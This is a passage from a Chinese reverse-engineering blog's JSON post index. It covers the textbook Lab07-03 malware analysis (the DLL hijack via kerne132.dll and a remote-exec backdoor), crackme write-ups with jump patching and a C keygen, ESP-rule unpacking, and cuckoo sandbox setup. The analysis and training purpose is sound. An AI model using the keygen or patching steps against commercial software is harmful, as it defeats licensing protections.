和lab07-03.dll进行了一系列的文件读写操作，这部分详情分析有点困难，我们留到动态分析的时候再来做。最后把文件lab07-03.dll拷贝到’C:\\Windows\\System32\\Kerne132.dll中。继续往下看，是一个函数4011e0,参数是c盘根目录，跟进去看一下发现是一个遍历文件夹的操作。判断是否是.exe文件，然后是进行内存映射，查找kernel32.dll字符串改为kerne132.dll字符串。意图很明显了，让c盘目录下的exe文件加载山寨的kerne132.dll。","text":"一、样本基本信息 .样本来源于恶意代码分析实战的第七章的实验样本lab07-03.exe,lab07-03.dll. 二、分析过程 首先查看下有什么关键字符串。strings.exe 程序查看lab07-03.exe 的字符串，发现有文件映射的一系列函数，CreateFileMappingA,UnmapViewOfFile,MapViewOfFile等，以及遍历文件的函数FindFirstFileA,FindNextFileA,FindClose,另外还有复制文件的函数和创建文件的函数等，没发现什么网络特征。再看下lab07-03.dll的字符串，首先是创建进程的函数CreateProcessA，然后是互斥体的函数CreateMutexA,OpenMutexA,等函数,此外发现了一些网络特征，ip地址 127.26.152.13，以及实现网络功能的库WS2_32.dll,还有一些字符串比较函数strcmp. 然后查看lab07-03.exe的导入表，可以看到前面所叙述的函数，同时应注意到，导入表中并没有LoadLibrary或者GetProcAddress函数，说明dll文件并没有在运行时加载。查看lab07-03.dll文件发现很多网络特征，很多网络函数，包括WSAStartup,socket,send,connect,recv等。 查看完这些后，心中稍微有点底，然后运行程序进行动态分析，配置网络环境ApateDNS,监控软件等。运行完程序发现秒退，什么也没有发生，process monitor和process explorer也什么没监控到，也没什么网络活动。猜测可能会有命令行参数。对lab07-03.exe进行逆向分析。载入IDA，进入主函数，发现果然有验证，判断参数是否为2，并且第二个参数是否“WARNING_THIS_WILL_DESTROY_YOUR_MACHINE”然后下面就是文件映射的操作了，对’C:\\Windows\\System32\\Kernel32.dll 和lab07-03.dll进行了一系列的文件读写操作，这部分详情分析有点困难，我们留到动态分析的时候再来做。最后把文件lab07-03.dll拷贝到’C:\\Windows\\System32\\Kerne132.dll中。继续往下看，是一个函数4011e0,参数是c盘根目录，跟进去看一下发现是一个遍历文件夹的操作。判断是否是.exe文件，然后是进行内存映射，查找kernel32.dll字符串改为kerne132.dll字符串。意图很明显了，让c盘目录下的exe文件加载山寨的kerne132.dll。 然后我们对lab07-03.dll进行静态ida反汇编看一下。dll的代码就很简单了，首先创建互斥体保证只有一个再运行，然后建立socket网络连接，ip是127.26.152.13，端口是80，首先 发送hello,并且利用shutdown()函数关闭套接字的写功能，然后就是recv进行监听了，如果受到的字符串是sleep就睡眠60秒，如果是exec那就是远程执行，创建进程，命令行参数此时未知。 下一步就是验证我们的猜想，在命令行加上正确的参数运行程序，构建好模拟网路和监控工具。 如图看到了文件映射的操作，以及大量的遍历操作，跟我们通过反汇编得到的结果几乎一致。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"迷路","slug":"迷路","date":"2017-07-31T16:00:00.000Z","updated":"2017-08-01T02:06:52.236Z","comments":true,"path":"2017/08/01/迷路/","link":"","permalink":"http://zwjsfdbb.top/2017/08/01/%E8%BF%B7%E8%B7%AF/","excerpt":"###步骤如下 1.这个题目是迄今遇到的最坑题目。话不多说，上题目。链接：http://pan.baidu.com/s/1hr5CtpU 密码：r9wi 2.首先运行题目，如下图所示，跟平常的题目没什么两样。随便输入字符串，发现弹出报错信息。咋一看，有关键字符串，好咧，这题不难，肯定可以找到关键挑战，然后问题就简单了。（太天真。。。） 3 打开OD载入程序，搜索字符串，发现关键字符串，很高兴。 在字符串上方发现两个跳转都跳到失败处，猜想应该是二次验证，一个一个分析，分析第一个call crackme.00402e40 ，发现是对输入的字符串进行一系列处理，然后得到一个数值，在下面语句中发现是和0x92381221 进行比较。不等则跳转向失败，打开IDA，分析关键call ,发现0x92381221代表的十进制数2453148193刚好符合条件，心中顿感，我实在是太聪明了。 继续往下看下一个跳转，call crackme.00401DF0,发现是两个字符串比较，猜想是我们前面的字符串进行再次的运算得到一堆字符串然后比较，然后分析可得处理函数为call crackme.00401990,分析关键call 发现是把输入进行MD5运算得到的一堆字符串。沃日。。。这控制不了啊。。。然后感觉不太对，于是我尝试暴力把跳转改一下，看会出现什么情况。发现既弹出了成功，又弹出来失败，感觉不对。 4.想着对消息框下个断点，F9运行，点击工具栏的W发现，竟然出现了两个输入Input,觉得肯定玄机在此，觉得其中一个按钮一定是被隐藏了，在command 位置下断点，输入 bp ShowWindow,寻找ShowWindow函数，重新运行程序，发现运行到了用户层，alt+f9运行出来，发现前面就是ShowWindow 窗口在此下断点，删除刚刚下的user32里的断点，发现参数信息为0时，为隐藏，为1时为显现，于是更改参数值如下图所示：","text":"###步骤如下 1.这个题目是迄今遇到的最坑题目。话不多说，上题目。链接：http://pan.baidu.com/s/1hr5CtpU 密码：r9wi 2.首先运行题目，如下图所示，跟平常的题目没什么两样。随便输入字符串，发现弹出报错信息。咋一看，有关键字符串，好咧，这题不难，肯定可以找到关键挑战，然后问题就简单了。（太天真。。。） 3 打开OD载入程序，搜索字符串，发现关键字符串，很高兴。 在字符串上方发现两个跳转都跳到失败处，猜想应该是二次验证，一个一个分析，分析第一个call crackme.00402e40 ，发现是对输入的字符串进行一系列处理，然后得到一个数值，在下面语句中发现是和0x92381221 进行比较。不等则跳转向失败，打开IDA，分析关键call ,发现0x92381221代表的十进制数2453148193刚好符合条件，心中顿感，我实在是太聪明了。 继续往下看下一个跳转，call crackme.00401DF0,发现是两个字符串比较，猜想是我们前面的字符串进行再次的运算得到一堆字符串然后比较，然后分析可得处理函数为call crackme.00401990,分析关键call 发现是把输入进行MD5运算得到的一堆字符串。沃日。。。这控制不了啊。。。然后感觉不太对，于是我尝试暴力把跳转改一下，看会出现什么情况。发现既弹出了成功，又弹出来失败，感觉不对。 4.想着对消息框下个断点，F9运行，点击工具栏的W发现，竟然出现了两个输入Input,觉得肯定玄机在此，觉得其中一个按钮一定是被隐藏了，在command 位置下断点，输入 bp ShowWindow,寻找ShowWindow函数，重新运行程序，发现运行到了用户层，alt+f9运行出来，发现前面就是ShowWindow 窗口在此下断点，删除刚刚下的user32里的断点，发现参数信息为0时，为隐藏，为1时为显现，于是更改参数值如下图所示： 复制到可执行文件，保存文件。再次运行发现果然出现了两个输入按钮。 5.修改后的程序重新加载进OD，此时发现感觉没什么思路，对获取输入字符串的函数进行下断点，在IDA中发现有GetWindowText函数，双加该函数，ctrl+x 获取其引用的位置，记下地址，在OD中ctrl+g 查找，找到该函数位置下断点，重新运行程序，输入字符串，点击左边的Input,程序运行到断点处，F8单步运行，发现下面有一个call ,F7进去看看，发现是获取字符串的长度，感觉好多Crackme都会对字符串的长度进行检查，于是对存字符串的位置下一个内存访问断点，看看是否有什么意外的惊喜，F9运行程序，发现程序到了这，IDA查看此位置的反编译结果，发现果然是对字符串的长度进行了检查，0x27u说明字符串长度为39,79，79,67,84,70,123,125刚好是题目所说的格式00CTF{},继续运行寻找返回的地方。最后回到401f96的位置，此处果然为一个调用，检查长度和格式。如果不符合返回值为0，跳到失败的位置。符合的话返回值为1，继续往下进行。 6 继续往下分析，分析各个call 的作用，发现call 1.00401860 位置的call 有很大的嫌疑，里面有各种循环，猜测为算法处理过程，IDA定位此处位置分析基本确定此位置，继续向下运行，查找字符串比较的过程，发现地址为401fca的调用，是弹出错错误的位置，此处下断点，重新运行程序到这个位置，F7进去分析，同时打开IDA，定位此函数，辅助分析，果然发现了两个MessageBOXA函数。分析不同的弹框结果发现前面是一个字符串比较函数，IDA按table键定位此函数的位置。 进去发现是一个一个进行字符的比较，比较字符串b5h760h64R867618bBwB48BrW92H4w5r 错误的话最后函数返回值为1，弹出错误对话框。 7.现在的问题就只剩下解决算法出路的问题了。IDA反编译出的代码如下 分析可知其对数字不做变换，大写字母减去65然后再进行关键操作，V9&#x3D;(V6+V5V7)%26+((V6+V5V7)%26&lt;0?0X1a:0)v6在调试的时候会出现32-2-2&#x3D;28，v5情况有点复杂，可能是3或者5，待会再说为什么，小写字母减去97然后进行关键操作，这样就进行了字符串的变换。关于v6的问题：该数值最早是函数0041458e 的返回值，返回值为-1的时候就赋值为3，否则为原数。我用3进行测试的时候发现是错误的，那这个函数0041458e 就很有问题。在此处下断点，F7进去发现是再次调用了函数41459c,继续跟进去同时观察IDA的结果， 发现其实就是判断_mbschr((const unsigned __int8 *)(a3 + *(_DWORD *)this),a2))的结果，点击该函数进去，OD定位该位置，单步运行会发现，其实是检查输入字符串的第六位是否为0，如果为0则返回 值为0的地址，后面是字符串的地址减去该地址为5，即为v6,否则的话返回值为-1，在后面的判断中赋值为3.此为v6的具体赋值过程。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"搭建虚拟网络环境inetsim","slug":"inetsim","date":"2017-07-21T16:00:00.000Z","updated":"2023-07-27T14:35:03.173Z","comments":true,"path":"2017/07/22/inetsim/","link":"","permalink":"http://zwjsfdbb.top/2017/07/22/inetsim/","excerpt":"主要步骤详见 1.inetsim 安装详见http://www.inetsim.org/packages.html 2.inetsim 配置详见http://www.cnblogs.com/hyq20135317/p/5515675.html","text":"主要步骤详见 1.inetsim 安装详见http://www.inetsim.org/packages.html 2.inetsim 配置详见http://www.cnblogs.com/hyq20135317/p/5515675.html","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"拯救我的虚拟机","slug":"拯救我的虚拟机","date":"2017-07-21T16:00:00.000Z","updated":"2023-07-27T14:33:12.216Z","comments":true,"path":"2017/07/22/拯救我的虚拟机/","link":"","permalink":"http://zwjsfdbb.top/2017/07/22/%E6%8B%AF%E6%95%91%E6%88%91%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA/","excerpt":"具体描述：由于物理磁盘空间不够，而虚拟机系统越来越大，最终导致ubuntu系统无法开机。 尝试方法1：找到虚拟机设置-&gt;选项-&gt;快照-&gt;恢复到快照。这个方法可以回到关机前的状态，这是你去删掉一些大文件，然后重新分配磁盘就可以了。 尝试方法2：另外新建一个虚拟机系统ubuntu,然后设置-&gt;硬盘-&gt;添加-&gt;硬盘-&gt;选择现有虚拟磁盘，然后找到你无法开机的虚拟机系统文件，确定然后开机。然后把你所需要的文件拷贝出来。然后我也删了一些东西，但是发现磁盘空间占用并没有缩小。所以此方法也只能用于拷贝重要资料而用。","text":"具体描述：由于物理磁盘空间不够，而虚拟机系统越来越大，最终导致ubuntu系统无法开机。 尝试方法1：找到虚拟机设置-&gt;选项-&gt;快照-&gt;恢复到快照。这个方法可以回到关机前的状态，这是你去删掉一些大文件，然后重新分配磁盘就可以了。 尝试方法2：另外新建一个虚拟机系统ubuntu,然后设置-&gt;硬盘-&gt;添加-&gt;硬盘-&gt;选择现有虚拟磁盘，然后找到你无法开机的虚拟机系统文件，确定然后开机。然后把你所需要的文件拷贝出来。然后我也删了一些东西，但是发现磁盘空间占用并没有缩小。所以此方法也只能用于拷贝重要资料而用。","categories":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"}],"tags":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"}]},{"title":"esp脱壳+文件大小自校验","slug":"esp脱壳+文件大小自校验","date":"2017-07-14T16:00:00.000Z","updated":"2023-07-27T14:11:50.785Z","comments":true,"path":"2017/07/15/esp脱壳+文件大小自校验/","link":"","permalink":"http://zwjsfdbb.top/2017/07/15/esp%E8%84%B1%E5%A3%B3+%E6%96%87%E4%BB%B6%E5%A4%A7%E5%B0%8F%E8%87%AA%E6%A0%A1%E9%AA%8C/","excerpt":"步骤如下1.查壳由图可见，显然有壳 2.找oep(ESP定律) 程序加载进OD，F8单步运行，右边寄存器窗口发现只有esp的值在变，符合ESP定律。在寄存器位置右键，点击HW-break下硬件断点。然后F9运行到断点处，到达跳转到oep 的前一步，单步运行，遇到如下图：右键分析点击在模块中删除分析，即得到OEP.在oep处右键用ollydump脱壳当前进程。复制当前oep. 3.脱壳(LordPE) 在lordPE中打开样本程序，选中右键纠正镜像大小，再右键完全脱壳。 4.修复导入表(ImportREC) 在ImportREC中打开目标进程即样本进程，然后右边选项中输入之前在OD中选中的OEP，点击IAT自动搜索，然后点击获取导入表。","text":"步骤如下1.查壳由图可见，显然有壳 2.找oep(ESP定律) 程序加载进OD，F8单步运行，右边寄存器窗口发现只有esp的值在变，符合ESP定律。在寄存器位置右键，点击HW-break下硬件断点。然后F9运行到断点处，到达跳转到oep 的前一步，单步运行，遇到如下图：右键分析点击在模块中删除分析，即得到OEP.在oep处右键用ollydump脱壳当前进程。复制当前oep. 3.脱壳(LordPE) 在lordPE中打开样本程序，选中右键纠正镜像大小，再右键完全脱壳。 4.修复导入表(ImportREC) 在ImportREC中打开目标进程即样本进程，然后右边选项中输入之前在OD中选中的OEP，点击IAT自动搜索，然后点击获取导入表。 5.文件大小自检 脱壳以后双击没得反应，可能是有文件大小自检校验，脱壳后的程序载入OD，在GetFileSize函数下断点，在插件中选API断点设置工具-&gt;常用API断点。选中文件类的GetFileSize.然后F9运行程序，到断点处停下，在堆栈中右键反汇编跟随，找到调用这个函数的位置，然后下断点，把刚刚的那个断点删除。在断点后发现是几个cmp ,很明显是比较文件大小，故而把这两个ｃｍｐ右键二进制－＞用ｎｏｐ填充。然后复制到可执行文件，保存文件。再次点击程序，发现正常运行。 **注：esp 定律** ESP定律算是我们在脱壳当中最常使用的方法之一，也特别适合像我一样的新手！而今天文章说的是ESP脱壳的原理和分析！只有知道原理了，我们的技术才能走得列远！ 一.准备知识在我们开始讨论ESP定律之前，我先给你讲解一下一些简单的汇编知识。 1.call 这个命令是访问子程序的一个汇编基本指令。也许你说，这个我早就知道了！别急请继续看完。call真正的意义是什么呢？我们可以这样来理解： 1.向堆栈中压入下一行程序的地址；2.JMP到call的子程序地址处。 例如： 代码: 00401029.E8 DA240A00 call 004A35080040102E.5A pop edx 在执行了00401029以后，程序会将0040102E压入堆栈，然后JMP到004A3508地址处！ 2.RETN 与call对应的就是RETN了。对于RETN我们可以这样来理解： 1.将当前的ESP中指向的地址出栈； 2.JMP到这个地址。 这个就完成了一次调用子程序的过程。在这里关键的地方是：如果我们要返回父程序，则当我们在堆栈中进行堆栈的操作的时候，一定要保证在RETN这条指令之前，ESP指向的是我们压入栈中的地址。这也就是著名的“堆栈平衡”原理！ 3.狭义ESP定律 ESP定律的原理就是“堆栈平衡”原理。 让我们来到程序的入口处看看吧！ 1.这个是加了ASPACK壳的入口时各个寄存器的值！ 代码: EAX 00000000 ECX 0012FFB0 EDX 7FFE0304 &#x2F;&#x2F;堆栈值 EBX 7FFDF000 &#x2F;&#x2F;堆栈值 ESP 0012FFC4 EBP 0012FFF0 ESI 77F57D70 ntdll.77F57D70 EDI 77F944A8 ntdll.77F944A8 EIP 0040D000 ASPACK. 2.这个是ASPACK壳JMP到OEP后的寄存器的值！ 代码: EAX 004010CC ASPACK.004010CC ECX 0012FFB0 EDX 7FFE0304 &#x2F;&#x2F;堆栈值 EBX 7FFDF000 &#x2F;&#x2F;堆栈值 ESP 0012FFC4 EBP 0012FFF0 ESI 77F57D70 ntdll.77F57D70 EDI 77F944A8 ntdll.77F944A8 EIP 004010CC ASPACK.004010CC 呵呵~是不是除了EIP不同以外，eax保存当前OEP值，其他都一模一样啊！ 为什么会这样呢？我们来看看 0040D000 A&gt; 60 pushad &#x2F;&#x2F;注意这里ESP&#x3D;0012FFC4 0040D001 E8 00000000 call ASPACK.0040D006 &#x2F;&#x2F;ESP&#x3D;0012FFA4 PUSHAD就是把所有寄存器压栈！我们在到壳的最后看看： 代码: 0040D558 61 popad &#x2F;&#x2F;ESP&#x3D;0012FFA4 0040D559 75 08 jnz short ASPACK.0040D563 &#x2F;&#x2F;注意这里ESP&#x3D;0012FFC4 也就是说当我们对ESP的0012FFA4下硬件访问断点之后。当程序要通过堆栈访问这些值，从而恢复原来寄存器的值，准备跳向苦苦寻觅的OEP的时候，OD帮助我们中断下来。 小结：我们可以把壳假设为一个子程序，当壳把代码解压前和解压后，他必须要做的是遵循堆栈平衡的原理。 因为大家对ESP理解各有异同，但是，大同小异！一般理解可以为： 1、在命令行下断hr esp-4（此时的ESP就是OD载入后当前显示的值） 2、hr ESP(关键标志下一行代码所指示的ESP值(单步通过))","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"第一次注册机","slug":"第一次编写注册机","date":"2017-07-11T16:00:00.000Z","updated":"2023-07-22T06:34:53.966Z","comments":true,"path":"2017/07/12/第一次编写注册机/","link":"","permalink":"http://zwjsfdbb.top/2017/07/12/%E7%AC%AC%E4%B8%80%E6%AC%A1%E7%BC%96%E5%86%99%E6%B3%A8%E5%86%8C%E6%9C%BA/","excerpt":"步骤如下1、破解样本 链接为 http://pan.baidu.com/s/1miA38A8 2、首先打开样本程序，得到关键字符串“Incorrect!!,Try Again”，如下 3、打开IDA加载该样本程序。打开View-&gt;Open Subviws-&gt;Strings 字符串窗口，搜索关键字符串,得到关键字符串”Correct way to go,You Got It”.点击找到数据段的定义位置，按下Ctrl+x 找到它的引用位置，然后按下tab键，找到反编译的结果。 分析反编译的c程序，发现其首先进行字符串长度的比较，然后把字符串和一个常数进行了一系列的操作。 4、打开od,载入程序定位到关键字符串的位置（在IDA中有具体地址），直接ctrl+G输入地址可以直接定位字符串位置，然后向上查找关键跳转，找到一个JNZ。。。。，直接断点，看下结果。然后发现跳转实现的话，直接后面单步执行，会弹出“Incorrect!!,Try Again”。尝试把跳转给改了，然后保存到文件，此时再随意输入，发现弹出“correct way to go”、 5、下面分析其算法逻辑。JNZ 前面的call下断点，单步进入发现是一个字符串你的比较，一个字符串是我们输入的第二个字，另一个是一个长字符串，猜测应该是第一个字符串经过一系列运算所得。向上分析，查找算法：找到GetDlgItemTextA_3097，为获取输入的字符串，然后后面是字符串长度的比较。 再后面就是其具体的算法了：","text":"步骤如下1、破解样本 链接为 http://pan.baidu.com/s/1miA38A8 2、首先打开样本程序，得到关键字符串“Incorrect!!,Try Again”，如下 3、打开IDA加载该样本程序。打开View-&gt;Open Subviws-&gt;Strings 字符串窗口，搜索关键字符串,得到关键字符串”Correct way to go,You Got It”.点击找到数据段的定义位置，按下Ctrl+x 找到它的引用位置，然后按下tab键，找到反编译的结果。 分析反编译的c程序，发现其首先进行字符串长度的比较，然后把字符串和一个常数进行了一系列的操作。 4、打开od,载入程序定位到关键字符串的位置（在IDA中有具体地址），直接ctrl+G输入地址可以直接定位字符串位置，然后向上查找关键跳转，找到一个JNZ。。。。，直接断点，看下结果。然后发现跳转实现的话，直接后面单步执行，会弹出“Incorrect!!,Try Again”。尝试把跳转给改了，然后保存到文件，此时再随意输入，发现弹出“correct way to go”、 5、下面分析其算法逻辑。JNZ 前面的call下断点，单步进入发现是一个字符串你的比较，一个字符串是我们输入的第二个字，另一个是一个长字符串，猜测应该是第一个字符串经过一系列运算所得。向上分析，查找算法：找到GetDlgItemTextA_3097，为获取输入的字符串，然后后面是字符串长度的比较。 再后面就是其具体的算法了： 用c代码来表示就是： #include&lt;stdio.h&gt; #include&lt;string.h&gt; int main() &#123; char name[200]; char key[100] = &#123; 0 &#125;; int nlen,i; // int 4个字节 int start; //int len=5; start=0x81276345; scanf(&quot;%s&quot;, name); nlen = strlen(name); if(nlen&gt;=5) &#123; //printf(&quot;%s&quot;, name); //printf(&quot;%c&quot;, name[0]); for(i=0;i&lt;nlen;i++) &#123; start=start+name[i]; //i=i&lt;&lt;8; //printf(&quot;%x\\n&quot;,i); start=start^(i&lt;&lt;8); //j=i+1; //tmp=len*i; //tmp=~tmp; //j=j*tmp; start=start*(i+1)*(~(nlen*i)); //printf(&quot;%x\\n&quot;,start); &#125; printf(&quot;%1u\\n&quot;,start); //u 代表无符号整数 system(&quot;pause&quot;); &#125; else &#123; printf(&quot;序列号不能少于5位\\n&quot;); system(&quot;pause&quot;); &#125; return 0; &#125; 输入任意大于等于5位的字符串，得到的结果就是其序列号。如","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"cuckoo真机分析环境(clonezilla)","slug":"cuckoo真机分析环境","date":"2017-07-10T16:00:00.000Z","updated":"2023-07-27T14:33:26.195Z","comments":true,"path":"2017/07/11/cuckoo真机分析环境/","link":"","permalink":"http://zwjsfdbb.top/2017/07/11/cuckoo%E7%9C%9F%E6%9C%BA%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83/","excerpt":"序言介绍：为了应对层出不穷的反虚拟机技术，本文实现一种真机搭建cuckoo的方式，结合国家网路中心的clonezila来实现分析机器的还原。 一、硬件准备*ubuntu16.04服务器一台(可在虚拟机中实现） *win7或者winxp一台 *交换机一台 二 .服务器搭建我选择的目前最新的ubuntu16.04，内置python2.7比较方便,当然也可以选择其他版本的系统，或者centos应该也可以，不过最好用ubuntu,因为资料较多，cuckoo官方资料也是用cuckoo搭建的。 1）.安装python2.7 这是cuckoo所需要的，如果你的系统内置了python2.7那就不用安装了，安装步骤网上教程一大堆，不再赘述。查看python版本 python -V，一般内置pip安装工具，没有的话另外安装一下。 2）.安装依赖库 1.安装相关的依赖库 sudo apt-get install python python-pip python-dev libffi-dev libssl-dev libxml2-dev libxslt1-dev libjpeg-dev","text":"序言介绍：为了应对层出不穷的反虚拟机技术，本文实现一种真机搭建cuckoo的方式，结合国家网路中心的clonezila来实现分析机器的还原。 一、硬件准备*ubuntu16.04服务器一台(可在虚拟机中实现） *win7或者winxp一台 *交换机一台 二 .服务器搭建我选择的目前最新的ubuntu16.04，内置python2.7比较方便,当然也可以选择其他版本的系统，或者centos应该也可以，不过最好用ubuntu,因为资料较多，cuckoo官方资料也是用cuckoo搭建的。 1）.安装python2.7 这是cuckoo所需要的，如果你的系统内置了python2.7那就不用安装了，安装步骤网上教程一大堆，不再赘述。查看python版本 python -V，一般内置pip安装工具，没有的话另外安装一下。 2）.安装依赖库 1.安装相关的依赖库 sudo apt-get install python python-pip python-dev libffi-dev libssl-dev libxml2-dev libxslt1-dev libjpeg-dev 然后去cuckoog官网或者github下载cuckoo最新版本,然后解压打开cuckoo文件夹，有个requiremens.txt的文件夹，这需要全部下载，可以用python的pip进行安装，其中其中的 pefile 需要从 Google Code 上下载，由于大陆网络限制，需要自备梯子，登上梯子后执行以下批量安装命令： pip install -r requirements.txt 或者先把pefile安装源码下载，手动安装，然后把它从requirements.txt里删除，然后用pip命令安装，个人建议用第二种方法。 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;2.Host 机需要可以嗅探网络数据包，需要安装 tcpdump ，如果本机没有，则执行以下命令安装 tcpdump： **apt-get install tcpdump** 如果系统没启用 root 账户，由于 tcpdump 的执行需要 root 权限，则需要以下配置： **$ sudo setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump** 如果系统里没有setcap命令，则需要安装 libpcap包： **$ sudo apt-get install libcap2-bin** 如果需要启用内存镜像分析，需要安装 volatility： **apt-get install volatility** 3）.cuckoo配置文件的修改 主要修改的文件有：cuckoo.conf,physical.conf,auliary.conf.重点修改前两个。 1.修改cuckoo.conf version_check = on 这个其实可以关掉，不然一直检查，如果你版本稍微低了一下就报错。 machinery = physical 这个地方改成physical ip = 192.168.56.1 根据你的实际情况填写 vm_state = 60 根据你的电脑实际还原时间填写 ;2.修改physical.conf user &#x3D; username password &#x3D; password 根据你的分析机填写 interface &#x3D; eth0根据你的网卡填写 ip &#x3D; 192.168.56.101根据你的分析机填写 4）.安装drbl 设置静态ip地址，直接在桌面设置及可以了。 2.安装drbl金钥 wget -q http://drbl.nchc.org.tw/GPG-KEY-DRBL -O- | sudo apt-key add - 3.添加drbl源(根据自己的系统版本修改一下） vi /etc/apt/sources.list deb http://free.nchc.org.tw/ubuntu xenial main restricted universe multiverse deb http://free.nchc.org.tw/drbl-core drbl stable 3.安装drbl sudo apt-get update sudo apt-get install drbl 4.设置drblserver sudo drblsrv -i 提示!当有yes&#x2F;no选项的时候，预设的值是大写的字母。例如 (y&#x2F;N), 预设值是 “N”, 当你按 “Enter”的时候，程式使用的值就是 “N”。如果你不确认选用那个好的时候，直接按”Enter”键是一个保险的方式.感觉不保险的话，去搜一下，很多介绍的，在这不赘述。 5.设置环境 sudo drblpush -i 提示!当有yes&#x2F;no选项的时候，预设的值是大写的字母。例如 (y&#x2F;N), 预设值是 “N”, 当你按 “Enter”的时候，程式使用的值就是 “N”。如果你不确认选用那个好的时候，直接按”Enter”键是一个保险的方式.感觉不保险的话，去搜一下，很多介绍的，一般都差不多。注意有一点，搜集网卡的时候尽量选择实时收集，然后收集完，注意查看是否有文件在相应目录，还有注意系统读取网卡文件的名字的命名方式，比如我的网卡为ens33,所以网卡文件为macadr-ens33.txt,但是系统读取文件的时候可能会去查找以macadr-eth开头的文件，所以遇到这种情况的话，去手动创建一个这样的文件就可以了。还有就是配置的时候尽量切到&#x2F;etc&#x2F;drbl目录下进行操作。 6.现在基本上drbl就设置好了。 5）、网路设置 由于我在虚拟机上搭建的服务器，所以我选择桥接模式，桥接到物理机有线网卡上，然后外接到交换机，然后分析机器也接到交换机，构成一个物理的局域网环境。 三.分析机设置1.首先安装python2.7，去python官网下载就好了。 2.关闭防火墙，自动更新，uac。 3.设置python运行权限为管理员。 4.设置固定ip.(注意此时的ip不要和clonezila给他分配的ip一致，否则在还原的时候，网络捕捉模块会抓取太多还原时候的无用包，从而导致分析报告异常庞大。） **到此整个环境搭建就已经差不多了。注意需要熟悉drbl的使用方法才能使用此环境。此外还需要把drbl还原分析机的指令加入到cuckoo的源代码里去。文件具体为：scheduler库文件，添加到让分析机关机指令的前面位置。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"栈基础知识","slug":"栈基础知识","date":"2017-07-09T16:00:00.000Z","updated":"2017-07-10T03:43:57.414Z","comments":true,"path":"2017/07/10/栈基础知识/","link":"","permalink":"http://zwjsfdbb.top/2017/07/10/%E6%A0%88%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","excerpt":"1.C语言变量的分布 ：C 语言有全局变量(Global)、本地变量(Local)，静态变量(Static)、寄存器变量(Regeister)。每种变量都有不同的分配方式。先来看下面这段代码： #include &lt;stdio.h&gt; int g1=0, g2=0, g3=0; int main() &#123; static int s1=0, s2=0, s3=0; int v1=0, v2=0, v3=0; //打印出各个变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;v1); //打印各本地变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;v2); printf(&quot;0x%08x\\n\\n&quot;,&amp;v3); printf(&quot;0x%08x\\n&quot;,&amp;g1); //打印各全局变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;g2); printf(&quot;0x%08x\\n\\n&quot;,&amp;g3); printf(&quot;0x%08x\\n&quot;,&amp;s1); //打印各静态变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;s2); printf(&quot;0x%08x\\n\\n&quot;,&amp;s3); system(&quot;pause&quot;); return 0; &#125; 可以看出本地变量和全局&#x2F;静态变量的分布完全不同，相差甚远，这是因为他们分布在不同类型的区域。进程的内存空间分为：代码区，静态数据区和动态数据区。全局和静态变量分配在静态数据区，本地变量分配在动态数据区，即”堆栈“， 2. 栈的存储 #include &lt;stdio.h&gt; void __stdcall func(int param1,int param2,int param3) &#123; int var1=param1; int var2=param2; int var3=param3; printf(&quot;0x%08x\\n&quot;,&amp;parameter1); //打印出各个变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;parameter2); printf(&quot;0x%08x\\n\\n&quot;,&amp;parameter3); printf(&quot;0x%08x\\n&quot;,&amp;var1); printf(&quot;0x%08x\\n&quot;,&amp;var2); printf(&quot;0x%08x\\n\\n&quot;,&amp;var3); return; &#125; int main() &#123; func(1,2,3); return 0; &#125; 函数的参数是从右向左传递，即先压栈parameter 3，然后parameter 2，最后才是parameter 1，然后是函数的返回地址，然后就是本地变量var1，var2,var3 3.程序进入main()函数 ，栈帧的保存和关闭例如：","text":"1.C语言变量的分布 ：C 语言有全局变量(Global)、本地变量(Local)，静态变量(Static)、寄存器变量(Regeister)。每种变量都有不同的分配方式。先来看下面这段代码： #include &lt;stdio.h&gt; int g1=0, g2=0, g3=0; int main() &#123; static int s1=0, s2=0, s3=0; int v1=0, v2=0, v3=0; //打印出各个变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;v1); //打印各本地变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;v2); printf(&quot;0x%08x\\n\\n&quot;,&amp;v3); printf(&quot;0x%08x\\n&quot;,&amp;g1); //打印各全局变量的内存地址 printf(&quot;0x%08x\\n&quot;,&amp;g2); printf(&quot;0x%08x\\n\\n&quot;,&amp;g3); 